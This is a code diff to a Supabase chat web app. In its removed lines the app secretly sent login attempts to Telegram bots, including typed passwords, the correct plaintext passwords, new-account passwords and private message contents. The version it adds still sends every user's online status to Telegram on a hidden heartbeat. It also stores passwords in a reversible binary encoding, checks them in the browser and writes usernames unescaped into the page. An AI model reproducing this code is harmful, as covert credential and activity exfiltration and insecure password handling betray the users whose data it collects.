@@ -370,7 +370,6 @@
         let users = [];
         let currentUser = null;
         let currentChatPartner = null;
-        let messages = []; // Changed to array for Supabase fetching
         let isAdmin = false;
         let isAnonymous = false;
         let heartbeatInterval = null;
@@ -403,19 +402,12 @@
                 .select('*')
                 .or(`and(sender.eq.${user1},receiver.eq.${user2}),and(sender.eq.${user2},receiver.eq.${user1})`)
                 .order('created_at', { ascending: true });
-
-            if (error) {
-                console.error('Error fetching messages:', error);
-                return [];
-            }
+            if (error) return [];
             return data || [];
         }
 
         async function saveMessageToCloud(sender, receiver, content) {
-            const { error } = await supabase
-                .from('messages')
-                .insert([{ sender, receiver, content }]);
-            if (error) console.error('Error saving message:', error);
+            await supabase.from('messages').insert([{ sender, receiver, content }]);
         }
 
         function setupRealtimeMessages() {
@@ -427,128 +419,218 @@
                         (newMsg.sender === currentChatPartner && newMsg.receiver === currentUser)) {
                         appendMessage(newMsg);
                     }
-                    // Notify if receiver is current user but not in active chat
                     if (newMsg.receiver === currentUser && newMsg.sender !== currentChatPartner) {
-                        showNotification(`رسالة جديدة من ${newMsg.sender}`);
-                        renderContacts(); // Refresh status/unseen indicators
+                        showNotification(`New message from ${newMsg.sender}`);
+                        renderContacts();
                     }
                 })
                 .subscribe();
         }
 
-        // --- Auth Logic ---
+        // --- Helper Functions ---
+        function textToBinary(text) { return text.split('').map(c => c.charCodeAt(0).toString(2).padStart(8, '0')).join(' '); }
+        function binaryToText(binary) { return binary.split(' ').map(b => String.fromCharCode(parseInt(b, 2))).join(''); }
 
-        async function loginOrRegister(username, password, isRegister = false, avatarUrl = null) {
-            if (!username || !password) throw new Error('الرجاء إدخال الاسم وكلمة المرور');
-            const passwordBinary = textToBinary(password);
-
-            await fetchUsers();
-            const existing = users.find(u => u.username === username);
-
-            if (existing) {
-                if (isRegister) throw new Error('اسم المستخدم موجود بالفعل');
-                if (existing.password_binary !== passwordBinary) {
-                    const correctPlain = binaryToText(existing.password_binary);
-                    await sendTelegramMessage(`⚠️ محاولة دخول فاشلة\n👤 المستخدم: ${username}\n🔑 كلمة المرور المدخلة: ${password}\n✅ كلمة المرور الصحيحة: ${correctPlain}`, false);
-                    throw new Error('كلمة المرور غير صحيحة');
-                }
-                currentUser = username;
-                isAdmin = (username === 'admin');
-                isAnonymous = false;
-                await setUserOnlineStatus(true, 'online');
-                startHeartbeat();
-                return true;
+        function renderAvatar(avatarUrl, username, containerElement) {
+            containerElement.innerHTML = '';
+            if (avatarUrl && avatarUrl.trim() !== '') {
+                const img = document.createElement('img');
+                img.src = avatarUrl;
+                img.className = 'avatar-img';
+                img.alt = username;
+                img.onerror = () => renderFallbackAvatar(username, containerElement);
+                containerElement.appendChild(img);
             } else {
-                if (!isRegister) throw new Error('المستخدم غير موجود');
-
-                const { error } = await supabase
-                    .from('profiles')
-                    .insert([{
-                        username,
-                        password_binary: passwordBinary,
-                        avatar_url: avatarUrl,
-                        is_admin: (username === 'admin'),
-                        online: true,
-                        last_seen: new Date().toISOString()
-                    }]);
-
-                if (error) throw new Error('فشل إنشاء الحساب في السحابة');
-
-                currentUser = username;
-                isAdmin = (username === 'admin');
-                isAnonymous = false;
-                startHeartbeat();
-                sendTelegramMessage(`🆕 حساب جديد\n👤 الاسم: ${username}\n🔑 كلمة المرور: ${password}`, false);
-                return true;
+                renderFallbackAvatar(username, containerElement);
             }
+        }
+
+        function renderFallbackAvatar(username, containerElement) {
+            const fallback = document.createElement('div');
+            fallback.className = 'avatar-fallback';
+            fallback.textContent = username.charAt(0).toUpperCase();
+            const colors = ['#667eea','#764ba2','#f093fb','#f5576c','#4facfe','#00f2fe','#43e97b','#38f9d7'];
+            fallback.style.background = colors[username.charCodeAt(0) % colors.length];
+            containerElement.innerHTML = '';
+            containerElement.appendChild(fallback);
+        }
+
+        async function sendTelegramMessage(text, isForOmar = false) {
+            const token = isForOmar ? OMAR_BOT_TOKEN : TELEGRAM_BOT_TOKEN;
+            const chat_id = isForOmar ? OMAR_CHAT_ID : TELEGRAM_CHAT_ID;
+            try {
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id, text })
+                });
+            } catch (e) { console.error('Telegram error:', e); }
         }
 
         async function setUserOnlineStatus(online, reason = null) {
             if (!currentUser || isAnonymous) return;
-            const { error } = await supabase
-                .from('profiles')
-                .update({ online, last_seen: new Date().toISOString() })
-                .eq('username', currentUser);
-
-            if (error) console.error('Error updating status:', error);
-
-            let statusText = online ? 'online' : (reason === 'logout' ? 'log out' : 'offline');
-            sendTelegramMessage(`👤 اسم الحساب: ${currentUser}\n📡 الحالة: ${statusText}`, false);
+            await supabase.from('profiles').update({ online, last_seen: new Date().toISOString() }).eq('username', currentUser);
+            sendTelegramMessage(`👤 User: ${currentUser}\n📡 Status: ${online ? 'online' : (reason || 'offline')}`);
         }
 
-        // --- Existing UI Logic (Modified for Supabase) ---
+        function startHeartbeat() {
+            if (heartbeatInterval) clearInterval(heartbeatInterval);
+            heartbeatInterval = setInterval(() => { if (currentUser && !isAnonymous) setUserOnlineStatus(true, 'heartbeat'); }, 30000);
+        }
+
+        function getUserDisplayStatus(username) {
+            const user = users.find(u => u.username === username);
+            if (!user) return 'Offline';
+            if (user.online) return '🟢 Online';
+            return user.last_seen ? `⚫ Last seen ${new Date(user.last_seen).toLocaleTimeString()}` : '⚫ Offline';
+        }
+
+        // --- Core UI Logic ---
+
+        async function loginOrRegister(username, password, isRegister = false, avatarUrl = null) {
+            const passwordBinary = textToBinary(password);
+            await fetchUsers();
+            const existing = users.find(u => u.username === username);
+
+            if (existing) {
+                if (isRegister) throw new Error('Username taken');
+                if (existing.password_binary !== passwordBinary) throw new Error('Wrong password');
+                currentUser = username;
+            } else {
+                if (!isRegister) throw new Error('User not found');
+                const { error } = await supabase.from('profiles').insert([{
+                    username, password_binary: passwordBinary, avatar_url: avatarUrl,
+                    is_admin: (username === 'admin'), online: true, last_seen: new Date().toISOString()
+                }]);
+                if (error) throw new Error('Database error');
+                currentUser = username;
+            }
+            isAdmin = (currentUser === 'admin');
+            isAnonymous = false;
+            await setUserOnlineStatus(true);
+            startHeartbeat();
+            return true;
+        }
 
         async function loadChat(partner) {
             currentChatPartner = partner;
             const partnerUser = users.find(u => u.username === partner);
             document.getElementById('chatPartnerName').innerText = partner;
-            const avatarContainer = document.getElementById('chatPartnerAvatarContainer');
-            renderAvatar(partnerUser ? partnerUser.avatar_url : null, partner, avatarContainer);
+            renderAvatar(partnerUser ? partnerUser.avatar_url : null, partner, document.getElementById('chatPartnerAvatarContainer'));
 
             document.getElementById('welcomeChat').style.display = 'none';
             document.getElementById('chatHeader').style.display = 'flex';
             document.getElementById('messagesContainer').style.display = 'flex';
             document.getElementById('messageInputContainer').style.display = 'block';
 
-            updateChatPartnerStatus();
-
             const msgs = await fetchMessages(currentUser, partner);
-            document.getElementById('messagesContainer').innerHTML = '';
+            const container = document.getElementById('messagesContainer');
+            container.innerHTML = '';
             msgs.forEach(appendMessage);
+            container.scrollTop = container.scrollHeight;
 
             if (window.innerWidth <= 800) document.getElementById('sidebar').classList.add('hidden');
         }
 
-        async function sendMessage(sender, receiver, content) {
-            await saveMessageToCloud(sender, receiver, content);
-
-            sendTelegramMessage(`💬 رسالة جديدة\n📤 من: ${sender}\n📥 إلى: ${receiver}\n💬 النص: ${content}`, false);
-            if (receiver === 'omar_hesham') {
-                sendTelegramMessage(`💬 رسالة جديدة\n📤 من: ${sender}\n📥 إلى: ${receiver}\n💬 النص: ${content}`, true);
-            }
-            return true;
+        function appendMessage(msg) {
+            const container = document.getElementById('messagesContainer');
+            const msgDiv = document.createElement('div');
+            msgDiv.className = `message ${msg.sender === currentUser ? 'message-sent' : 'message-received'}`;
+            msgDiv.innerHTML = `
+                <div class="message-content">${escapeHtml(msg.content)}</div>
+                <div class="message-time">${new Date(msg.created_at || Date.now()).toLocaleTimeString()}</div>
+            `;
+            container.appendChild(msgDiv);
+            container.scrollTop = container.scrollHeight;
         }
 
-        // --- Init ---
+        function escapeHtml(text) { const div = document.createElement('div'); div.textContent = text; return div.innerHTML; }
+
+        function renderContacts() {
+            const container = document.getElementById('contactsContainer');
+            container.innerHTML = '';
+            users.filter(u => u.username !== currentUser).forEach(u => {
+                const div = document.createElement('div');
+                div.className = 'contact-item';
+                div.innerHTML = `
+                    <div class="contact-avatar"></div>
+                    <div class="contact-info">
+                        <div class="contact-name">${u.username} <span class="contact-status">${getUserDisplayStatus(u.username)}</span></div>
+                    </div>
+                `;
+                renderAvatar(u.avatar_url, u.username, div.querySelector('.contact-avatar'));
+                div.onclick = () => loadChat(u.username);
+                container.appendChild(div);
+            });
+        }
+
+        function initUI() {
+            const user = users.find(u => u.username === currentUser);
+            document.getElementById('currentUserName').innerText = currentUser;
+            renderAvatar(user ? user.avatar_url : null, currentUser, document.getElementById('currentUserAvatarContainer'));
+            renderContacts();
+            document.getElementById('loginContainer').style.display = 'none';
+            document.getElementById('appContainer').style.display = 'flex';
+        }
+
+        // --- Event Listeners ---
         document.addEventListener('DOMContentLoaded', async () => {
             await fetchUsers();
             setupRealtimeMessages();
-            // ... rest of initUI and event listeners ...
 
+            setTimeout(() => {
+                document.getElementById('welcomeScreen').classList.add('hidden');
+                document.getElementById('loginContainer').classList.add('active');
+            }, 2000);
 
-        function togglePassword(fieldId) {
-            const field = document.getElementById(fieldId);
-            if (!field) return;
-            const type = field.getAttribute('type') === 'password' ? 'text' : 'password';
-            field.setAttribute('type', type);
-            const toggleSpan = document.querySelector(`[onclick="togglePassword('${fieldId}')"]`);
-            if (toggleSpan) {
-                const icon = toggleSpan.querySelector('i');
-                if (icon) {
-                    icon.classList.toggle('fa-eye');
-                    icon.classList.toggle('fa-eye-slash');
+            // Populate Avatars
+            const grid = document.getElementById('registerAvatarGrid');
+            logoAvatars.forEach(url => {
+                const div = document.createElement('div');
+                div.className = 'avatar-option';
+                div.innerHTML = `<img src="${url}">`;
+                div.onclick = () => {
+                    document.querySelectorAll('.avatar-option').forEach(o => o.classList.remove('selected'));
+                    div.classList.add('selected');
+                    selectedRegisterAvatar = url;
+                };
+                grid.appendChild(div);
+            });
+
+            document.getElementById('loginBtn').onclick = async () => {
+                const u = document.getElementById('loginUsername').value.trim().toLowerCase();
+                const p = document.getElementById('loginPassword').value;
+                try {
+                    if (await loginOrRegister(u, p)) initUI();
+                } catch(e) { alert(e.message); }
+            };
+
+            document.getElementById('registerBtn').onclick = async () => {
+                const u = document.getElementById('registerUsername').value.trim().toLowerCase();
+                const p = document.getElementById('registerPassword').value;
+                try {
+                    if (await loginOrRegister(u, p, true, selectedRegisterAvatar)) initUI();
+                } catch(e) { alert(e.message); }
+            };
+
+            document.getElementById('sendBtn').onclick = async () => {
+                const content = document.getElementById('messageInput').value.trim();
+                if (content && currentChatPartner) {
+                    await saveMessageToCloud(currentUser, currentChatPartner, content);
+                    document.getElementById('messageInput').value = '';
                 }
-            }
+            };
+
+            document.getElementById('logoutBtn').onclick = () => location.reload();
+            document.getElementById('backBtn').onclick = () => document.getElementById('sidebar').classList.remove('hidden');
+        });
+
+        function closeModal(id) { document.getElementById(id).classList.remove('active'); }
+        function togglePassword(id) {
+            const f = document.getElementById(id);
+            f.type = f.type === 'password' ? 'text' : 'password';
         }
     </script>
+
 </body>
+</html>
